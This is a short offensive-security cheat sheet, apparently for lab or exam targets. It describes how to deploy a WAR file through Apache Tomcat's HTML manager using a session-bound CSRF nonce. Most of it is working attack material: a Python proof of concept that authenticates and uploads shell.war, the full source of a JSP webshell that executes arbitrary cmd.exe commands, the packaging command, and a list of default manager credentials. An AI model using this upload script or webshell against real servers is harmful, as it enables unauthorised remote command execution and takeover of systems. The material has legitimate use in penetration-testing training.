# Tomcat Manager WAR Deploy via HTML (manager-gui only)

## When to Use
Tomcat user has `manager-gui` role but NOT `manager-script`.
- `/manager/text/deploy` returns 403
- `/manager/html` login works (200 with deploy form)

## Technique: Multipart Upload with CSRF Nonce

The HTML Manager interface has CSRF protection. Deploy must:
1. GET /manager/html in same session (get cookies + CSRF nonce)
2. Extract CSRF_NONCE from response body
3. POST multipart to `/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=<nonce>`

### Python PoC (requests)

```python
import requests, re

s = requests.Session()
s.auth = ('tomcat', 'tomcat')
s.verify = False

# Get CSRF nonce
r = s.get('http://TARGET:8080/manager/html')
nonce = re.search(r'CSRF_NONCE=([A-F0-9]+)', r.text).group(1)

# Deploy WAR
url = f'http://TARGET:8080/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE={nonce}'
r2 = s.post(url, files={'deployWar': ('shell.war', open('shell.war','rb'), 'application/octet-stream')})

if '/shell' in r2.text:
    print('DEPLOYED: /shell')
```

### Key Points
- Same session required (nonce tied to JSESSIONID)
- Nonce expires quickly — extract and use in same script
- curl two-step FAILS (nonce expires between commands)
- WAR name becomes the context path (shell.war → /shell/)

## Minimal JSP Webshell (Windows)

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
  Process p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line;
  while ((line = br.readLine()) != null) { out.println(line); }
}
%>
```

Package: `jar -cf shell.war cmd.jsp WEB-INF/web.xml`

## Tomcat 9.0.0.M9 Specific Notes
- Very old milestone release (2016), likely intentionally vulnerable in exam/lab
- CVE-2017-12617 (PUT RCE) may apply but requires readonly=false in web.xml
- Default manager-gui creds: tomcat:tomcat, admin:admin, tomcat:s3cret
